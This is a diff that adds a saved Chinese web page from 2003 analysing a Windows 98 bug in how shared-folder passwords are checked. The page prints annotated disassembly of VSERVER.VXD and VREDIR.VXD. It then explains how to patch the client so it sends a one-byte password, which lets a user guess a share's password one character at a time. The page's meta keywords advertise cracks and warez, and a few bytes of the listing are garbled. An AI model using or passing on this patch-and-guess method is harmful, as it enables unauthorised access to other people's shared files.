@@ -1,0 +1,96 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0048)http://soft.winzheng.com/InfoView/Article_35.htm -->
+<!-- 页面头部开始 --><HTML><HEAD><TITLE>WINDOWS98共享目录密码校验BUG的分析</TITLE>
+<META http-equiv=Content-Type 
+content="crack,netsoftware,CrackingTutorials,yingzheng,winzheng,text/html; charset=gb2312">
+<META 
+content="0day ,appz, crackz, DivX, download, freeware, gamez, keyfilemakers, keygenerators, keygens, keymakers, linkz, passwordz, program, registers, serialz, sharekey, shareware, software, underground, warez, windows, 破解, 注册, 注册码, 注册机, 注册器, 序列号, 黑客, 共享, 软件, 下载, 软钥, 腹, 硁ン猔, 硁ン瘆秆, 猔诀,China, Internet, shareware, archive, software, freeware, 3D, media, game, games, office, ftp, free, java, program, file, files, programming, animation, VRML, word processing, anti-virus, applets, applications, arcade, audio, utilities, backup, bbs, board, browser, browsers, card, casino, CGI, DOWNLOAD.COM.CN, WWW.DOWNLOAD.COM.CN, download.com.cn, www.download.com.cn, FREEFTP, freeftp, cgis, chat, tools, utilities, classic, collections, communication, communications, compression, connectivity, data, database, development, drivers, education, electronic publications, email,winamp, ip, icq,qq,download,oicq,crack,winzheng.com,赢政,中国, 软件, 服务, 信息, 共享软件, 免费软件, 自由软件, 免费, 下载, 免费下载,游戏,破解,注册,杀毒,黑客" 
+name=keywords>
+<META content=winzheng name=author>
+<META http-equiv=winzheng.com content=no-cache><LINK 
+href="WINDOWS98共享目录密码校验BUG的分析.files/style.css" type=text/css rel=stylesheet>
+<META content="Microsoft FrontPage 5.0" name=GENERATOR></HEAD>
+<BODY leftMargin=0 topMargin=0>
+            <TABLE cellSpacing=3 cellPadding=0 width="99%" align=center 
+border=0>
+              <TR>
+                <TD align=middle height=30><SPAN 
+                  class=article_title><B>WINDOWS98共享目录密码校验BUG的分析</B></SPAN></TD></TR>
+              <TR>
+                <TD align=middle height=35>日期：2003年6月8日 作者：liangs&nbsp; 
+                  <HR color=#999999 noShade SIZE=1>
+                </TD></TR>
+              <TR>
+                <TD id=zoom>
+                  <BLOCKQUOTE>
+                    <p>WINDOWS98的共享目录密码校验有BUG。下面是文件VSERVER。VXD中密码校验过程调用的有BUG的一段程序。 
+                    <BR>&nbsp; &nbsp; 
+                    3647是判断客户端密码是不是输入没密码，这时密码项内容是0X20，空格。不是就转&nbsp; 
+                    LOC-0444。365A判断客户端通过网络通信发过来的加密后密码长度是0X18吗，一般都是。这转LOC-0447去把共享目录密码加密同网络通信过来的密码比较，通过TEST 
+                    EAX，EAX设置ZF标记判断密码对不对。如果密码长度不是0X18，可能是别的什么方式的密码比较，这儿密码是明码没加密。再判断密码长度大于9不，共享密码长度是1-8个字母数字等。下面就是比较密码，后面的循环是以ECX密码长度和ZF标记为结束条件。显然这儿应该有BUG，这密码长度ECX应该是本声密码的长度，而这儿密码长度是网络通信发过来的数据。所以我发过来的数据是1就只比较了一个密码的最前面字节。如果这一字节对就ZF=0因ECX=0退出结果是校验密码成功。 
+                    <BR><BR>03647&nbsp; &nbsp; loc_0442: ;&nbsp; xref 03635 
+                    <BR>03647&nbsp; 66| 83 3A 20&nbsp; cmp word ptr [edx],20h 
+                    ;THE SHARE PASSWORD <BR>0364B&nbsp; 75 0D&nbsp; &nbsp; 
+                    &nbsp; &nbsp; jne short loc_0444 ; Jump if not equal 
+                    <BR>0364D&nbsp; B8 08460002 mov eax,8460002h <BR>03652&nbsp; 
+                    F9 stc ; Set carry flag <BR>03653&nbsp; C9&nbsp; &nbsp; 
+                    &nbsp; &nbsp; &nbsp; &nbsp; leave ; Procedure exit 
+                    <BR>03654&nbsp; C3 retn <BR>03655 loc_0443: ;&nbsp; xref 
+                    03640, 3645 <BR>03655&nbsp; 80 3F 00 cmp byte ptr [edi],0 
+                    <BR>03658&nbsp; 74 26 je short loc_0446; Jump if equal 
+                    <BR>0365A loc_0444: ;&nbsp; xref 0364B <BR>0365A&nbsp; 83 F9 
+                    18 cmp ecx,18h ; THIS HAS BUG FOUND BY YRG&nbsp; 1999.1.15 
+                    <BR>0365D&nbsp; 74 24&nbsp; &nbsp; &nbsp; je short loc_0447 
+                    ; Jump if equal <BR>0365F&nbsp; 83 F9 09&nbsp; cmp ecx,9 
+                    <BR>03662&nbsp; 77 1C&nbsp; ja short loc_0446 ; Jump if 
+                    above <BR>03664&nbsp; F5&nbsp; cmc ; Complement carry 
+                    <BR>03665&nbsp; 83 D9 00&nbsp; sbb ecx,0 <BR>03668&nbsp; 
+                    51&nbsp; push ecx <BR>03669&nbsp; 53&nbsp; push ebx 
+                    <BR>0366A&nbsp; 8B 1D 000137F4 mov ebx,dword ptr data_0461 ; 
+                    (137F4=137FCh) <BR>03670&nbsp; 8B F2 mov esi,edx 
+                    <BR>03672&nbsp; 2B C0 sub eax,eax <BR>03674&nbsp; 4F dec edi 
+                    <BR><BR>03675 locloop_0445: ;&nbsp; xref 0367C 
+                    <BR>03675&nbsp; 47 inc edi <BR>03676&nbsp; AC lodsb ; String 
+                    [si] to al <BR>03677&nbsp; 8A 04 18 mov al,[eax][ebx] 
+                    <BR>0367A&nbsp; 3A 07&nbsp; cmp al,[edi] ;BUG !!! I CAN SET 
+                    ECX=1 <BR>0367C&nbsp; E1 F7&nbsp; &nbsp; &nbsp; &nbsp; 
+                    loopdz locloop_0445&nbsp; ; Loop if zf=1, ecx&gt;0 
+                    <BR><BR>0367E&nbsp; 5B&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop 
+                    ebx <BR>0367F&nbsp; 59&nbsp; pop ecx <BR>03680&nbsp; 
+                    loc_0446: ;&nbsp; xref 03658, 3662, 36A1 <BR>03680 鶩8&nbsp; 
+                    clc ; Clear carry flag <BR>03681&nbsp; C9&nbsp; leave ; 
+                    Procedure exit <BR>03682&nbsp; C3&nbsp; retn <BR>03683&nbsp; 
+                    loc_0447: ;&nbsp; xref 0365D <BR>03683&nbsp; 81 EC 000000E4 
+                    sub esp,0E4h <BR>03689&nbsp; 8B C4 mov eax,esp 
+                    <BR>0368B&nbsp; 60 pushad ; Save all regs <BR>0368C ?2 push 
+                    edx ; PARAMETER_4 <BR>0368D&nbsp; 50 push eax ; PARAMETER_3 
+                    <BR>0368E&nbsp; 8B 45 08 mov eax,dword ptr [ebp+PARAMETER_1] 
+                    <BR>03691&nbsp; 8B 40 24 mov eax,dword ptr [eax+24h] 
+                    <BR>03694&nbsp; 50 push eax ; PARAMETER_2 <BR>03695&nbsp; 57 
+                    push edi ; PARAMETER_1 <BR>03696&nbsp; E8 000036A1 call 
+                    sub_0054 ; (06D3C) <BR>0369B&nbsp; 83 C4 10 add esp,10h 
+                    <BR>0369E&nbsp; 85 C0 test eax,eax <BR>036A0&nbsp; 61 popad 
+                    ; Restore all regs <BR>036A1&nbsp; EB DD jmp short loc_0446 
+                    <BR><BR><BR>好了，那就找客户端发密码的代码。下面是VREDIR。VXD的这段相关代码。 
+                    <BR>15FCE的18H就是前面的那比较18H的。这儿改成可以1。CALL 
+                    SUB-0067是加密输入的密码的过程调用。15FEA 的 
+                    <BR>EDX是指向输入的密码的指针。所以15FE9可以改成MOV AL，[EDX]， <BR>MOV [ECX]，AL 
+                    <BR>JMP 15FF4 
+                    <BR><BR>就可以。这样进入有密码的共享目录就可以用字母A-Z，数字0-9等试会很快的进入目录的。当然最好那儿自动 
+                    <BR>这么变化那AL，免得每次还要输入可以加快速度。 <BR><BR>15FC8&nbsp; 8B 4D EC mov 
+                    ecx,dword ptr [ebp-14h] <BR>15FCB&nbsp; 8B 55 F4&nbsp; 
+                    &nbsp; mov edx,dword ptr [ebp-0Ch] <BR>15FCE&nbsp; 66| C7 41 
+                    07 0018 mov word ptr [ecx+7],18h; PASSWORD LONG 
+                    <BR>15FD4&nbsp; 83 C1 07 add ecx,7 <BR>15FD7&nbsp; 83 C2 35 
+                    add edx,35h <BR>15FDA&nbsp; 8B 45 F8 mov eax,dword ptr 
+                    [ebp-8] <BR>15FDD&nbsp; 83 C0 6C add eax,6Ch <BR>15FE0&nbsp; 
+                    89 4D F0 mov dword ptr [ebp-10h],ecx <BR>15FE3&nbsp; 8B 4D 
+                    EC mov ecx,dword ptr [ebp-14h] <BR>15FE6&nbsp; 83 C1 0B add 
+                    ecx,0Bh <BR>15FE9&nbsp; 51 push ecx ;LOCKED&nbsp; PASSWORD 
+                    SET HERE&nbsp; <BR>15FEA&nbsp; 52 push edx ;PASSWORD POINTER 
+                    <BR>15FEB&nbsp; 50 push eax <BR>15FEC&nbsp; E8 FFFF0EC5 call 
+                    sub_0067 ; LOCK THE PASSWORD ; (06EB6) <BR>15FF1&nbsp; 83 C4 
+                    0C add esp,0Ch <BR>15FF4&nbsp; EB 71 jmp short loc_1765 </p>
+                  </BLOCKQUOTE>
+                  <P align=right>（出处：赢政天下收集整理）</P></TD></TR>
+              </TABLE></BODY></HTML>  
